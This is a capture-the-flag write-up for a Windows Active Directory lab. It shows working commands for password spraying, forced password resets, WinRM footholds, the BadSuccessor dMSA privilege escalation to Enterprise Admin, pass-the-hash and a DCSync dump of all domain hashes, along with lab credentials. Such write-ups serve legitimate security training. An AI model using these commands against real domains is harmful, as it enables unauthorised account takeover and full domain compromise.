# [HackSmarter.org - MidGarden2](https://www.hacksmarter.org/courses/da0b5de0-4949-4f3e-99a6-cc624b119acb/take)

![c6817876a05cc75b12d7c2642f99e136.png](/resources/c6817876a05cc75b12d7c2642f99e136.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Obtaining Thor's password](#obtaining-thors-password)
- [ForceChangePassword on Hodr and footholding](#forcechangepassword-on-hodr-and-footholding)
- [BadSuccessor to Enterprise Admins](#badsuccessor-to-enterprise-admins)

***
## Abstract 
MidGarden2 is a Norse-themed Windows Active Directory machine where we are provided with a valid domain user credential in an assumed breach scenario for pentesting Windows Active Directory.

Upon engagement, we retrieve the password of "Thor" from the description attribute of this user account, and then use that credential to change the 
password of "Hodr" using the "ForceChangePassword" right inherited from the "PC Specialist 2" group.

As "Hodr" is a member of "webServerAdmins" group, which is also a member of "Remote Management Users", we establish a foothold via Windows Remote Management protocol (WinRM).

The domain controller runs Windows Server 2025. After compromising "Hodr", who is a member of "webServerAdmins" with permissions over `OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter` OU, 
we leverage the BadSuccessor attack by adding the high-value target "Ymir" (Enterprise Admin) as the successor of the new dMSA. We then retrieve the NT hash of Ymir from the "Previous Keys" 
field leaked by requesting S4U2Self 
for the dMSA account, and use this hash to authenticate as Ymir and compromise the domain or use a new TGT ticket to authenticate as "Ymir"

## Scope and Objective
As a member of the Hack Smarter Red Team, you have been assigned to this engagement to conduct a comprehensive penetration test of the client's internal environment.

The client has a mature security posture and has previously undergone multiple internal penetration testing engagements. Given our team's advanced expertise in ethical hacking, the primary objective of this assessment is to identify attack vectors that may have been overlooked in prior engagements.

**Starting Credentials**
```
freyja:Fr3yja!Dr@g0n^12
```

## Enumeration

I will start with rustscan since it is faster than nmap and VPN connection can tolerate this much of traffic unlike HTB. (I could not use rustscan could not be used on HTB) and we can see a lot of port opening on this machine as expected since this is the domain controller
```
rustscan -a $IP -- -A
```
![0b260d545c26c18d01eb219a19b5fb39.png](/resources/0b260d545c26c18d01eb219a19b5fb39.png)

we can also obtain "MIDGARDDC" "yggdrasil.hacksmarter" and "MidgardDC.yggdrasil.hacksmarter" from this scan to map with the IP address in our hosts file

![6a8a6e8de7a8e7b3d2a52fcba47e7df1.png](/resources/6a8a6e8de7a8e7b3d2a52fcba47e7df1.png)

Next, I use the provided credential to enumerate file share and we can see that there is 1 non-standard file share which we can not have any permission over it yet.

```
uv run nxc smb yggdrasil.hacksmarter -u freyja -p 'Fr3yja!Dr@g0n^12' --shares
```
![95e7bb1cc56cc26c17ff4846524e8d64.png](/resources/95e7bb1cc56cc26c17ff4846524e8d64.png)

I use rusthound to retrieve domain information and that can be used to visualize the dangerous relationship between each domain object on the bloodhound.

```
rusthound-ce -d yggdrasil.hacksmarter -u 'freyja' -p 'Fr3yja!Dr@g0n^12' -z
```
![d8bd974c438e805d35f5e2d6c26fb6dc.png](/resources/d8bd974c438e805d35f5e2d6c26fb6dc.png)

## Obtaining Thor's password

I will also pull a valid domain user list to a new text file first so if I obtained a new hash or a password then I can only spray on the valid domain user which we can see a lot of juicy information from the description of each user including password of "Thor" user.

```
uv run nxc ldap yggdrasil.hacksmarter -u freyja -p 'Fr3yja!Dr@g0n^12' --users-export user.txt
```
![4be5bb5bbb8020eaf0181d4ab53099ce.png](/resources/4be5bb5bbb8020eaf0181d4ab53099ce.png)

After spraying this password to all valid domain users, we can see that this password can be used on "Thor" account only.

```
uv run nxc smb yggdrasil.hacksmarter -u user.txt -p 'Th0r!W!nt3rFang' --continue-on-success
```
![ebcd5d7b032c7d78d84ddc923b4c0c06.png](/resources/ebcd5d7b032c7d78d84ddc923b4c0c06.png)

## ForceChangePassword on Hodr and footholding

From the bloodhound result, we can see that "Thor" user is a member of "PC Specialist 2" group that has "ForceChangePassword" right over "Hodr" user and we can get a foothold once we change his password as his group is a member of Remote Management Users.

![a21b036da9af72973951f12b90850174.png](/resources/a21b036da9af72973951f12b90850174.png)

I will use bloodyAD to change the password of "Hodr" user and now we should be able to get a foothold on the machine.

```
bloodyAD --host $IP -d "yggdrasil.hacksmarter" -u "Thor" -p 'Th0r!W!nt3rFang' set password "Hodr" "Password123"
```
![d3c7a0f3d9d265b32f302647eceb39f6.png](/resources/d3c7a0f3d9d265b32f302647eceb39f6.png)

Using tool like evil-winrm or evil-winrm.py, we can now loot user flag on the desktop of "Hodr" user.

```
evil-winrm -i yggdrasil.hacksmarter -u "Hodr" -p 'Password123'
```
![130a35df6c16ff36fddb9e8dc0c52307.png](/resources/130a35df6c16ff36fddb9e8dc0c52307.png)

## BadSuccessor to Enterprise Admins

While looking at the result of NetExec, we can see that NetExec return "Windows 11 / Server 2025 Build 26100" which mean this domain controller is running on Windows Server 2025 and by inspecting "scripts" folder which is the folder we discovered as non-standard file share at the start, we can see 3 PowerShell scripts that can be used for administrative task on this domain and it also gives us a hint about badsuccessor exploitation as well.

![a2712cfa66da0decea662dcb757b0785.png](/resources/a2712cfa66da0decea662dcb757b0785.png)

BadSuccessor is an attack that abuse the dMSA migration process for privilege escalation. We can check if we can leverage this 
attack with the bad-successor module of NetExec, which reveals that as "Hodr", which is a member of "webServerAdmins" group have permissions over `OU=Web Servers,OU=Yggdrasil 
Servers,DC=yggdrasil,DC=hacksmarter` OU which is enough for the bad successor exploitation.

```
uv run nxc ldap yggdrasil.hacksmarter -u 'Hodr' -p 'Password123' -M badsuccessor
```
![10e20504c6132976c3e4b119d3aba114.png](/resources/10e20504c6132976c3e4b119d3aba114.png)

We can then create a new dMSA account in this 
OU and use high valued target as its successor then the new dMSA account will have all the permissions of the target.

From the bloodhound, we can see that there are 3 high valued targets on this domain which I will focus on Ymir as it is the enterprise admins on this domain. 

![7f51fa5039029844b007356765ffc585.png](/resources/7f51fa5039029844b007356765ffc585.png)

![5d19ac37261087c62e42f1ed0ec85c41.png](/resources/5d19ac37261087c62e42f1ed0ec85c41.png)

I will use `badsuccessor.py` from Impacket to conduct the BadSuccessor attack. 

First, we need to verify if we can leverage this attack by running the following 
command, which confirms that as a member of the "webServerAdmins" group, we have 
the necessary permissions to create dMSA account in the vulnerable OU.

```
uv run badsuccessor.py -dmsa-name webadmin -target-ou 'OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter' -dc-ip $IP -dc-host MidgardDC.yggdrasil.hacksmarter -method LDAP yggdrasil.hacksmarter/Hodr:Password123
```
![ed4abac8c2cf4e29aabea634b9a97663.png](/resources/ed4abac8c2cf4e29aabea634b9a97663.png)

Now I'll create a new dMSA account named "webadmin" and add "Ymir" as its successor. This will 
allow us to extract Ymir's NT hash from the `Previous Keys` field when we impersonate this new dMSA with `getST.py` from impacket later.

```
uv run badsuccessor.py -dmsa-name webadmin -target-ou 'OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter' -action add -target-account Ymir -dc-ip $IP -dc-host MidgardDC.yggdrasil.hacksmarter -method LDAP yggdrasil.hacksmarter/Hodr:Password123
```
![0988ba91cfe7bbc45eeaddd0a507b4d2.png](/resources/0988ba91cfe7bbc45eeaddd0a507b4d2.png)

Now we can use `getST.py` to impersonate "webadmin" dMSA and retrieve both TGT of the "webadmin" account which have all permissions of "Ymir" user or even NT hash of "Ymir" user itself in "Previous Keys" field.

```
getST.py yggdrasil.hacksmarter/hodr:Password123 -dc-ip 10.1.241.144 -impersonate 'webadmin$' -dmsa -self
```
![5fcddd64066c8dc42b5e145e5accbf85.png](/resources/5fcddd64066c8dc42b5e145e5accbf85.png)

We can now confirm the hash of "Ymir" user with NetExec and as we can see the "Pwn3d!" sign, we now have administraive level over this domain controller.

```
uv run nxc smb yggdrasil.hacksmarter -u "Ymir" -H 8dd4cfe0f89272424e50f5089b8696ec
```
![a3297f898a7a4723adb93c99ec1efb9c.png](/resources/a3297f898a7a4723adb93c99ec1efb9c.png)

We can use evil-winrm to access to domain controller without triggering the Windows Defender and loot root flag.

```
evil-winrm -i yggdrasil.hacksmarter -u "Ymir" -H 8dd4cfe0f89272424e50f5089b8696ec 
```
![996c9ac998704ff4ebe4e4bb63363c6c.png](/resources/996c9ac998704ff4ebe4e4bb63363c6c.png)

Alternatively, we can also use TGT ticket ot the new dMSA account to access the domain controller as well.

```
KRB5CCNAME='webadmin$@krbtgt_YGGDRASIL.HACKSMARTER@YGGDRASIL.HACKSMARTER.ccache' netexec smb yggdrasil.hacksmarter --use-kcache
```
![609ab5286a359a0b5aafd8613882dd57.png](/resources/609ab5286a359a0b5aafd8613882dd57.png)

We can also use impacket secretdump to conduct DCSync attack and obtain hash of all users of this domain.

```
impacket-secretsdump Ymir@yggdrasil.hacksmarter -hashes :8dd4cfe0f89272424e50f5089b8696ec -just-dc
```
![5d19af0b57ee26f5e614c078277ff523.png](/resources/5d19af0b57ee26f5e614c078277ff523.png)

Now we are done :D

***
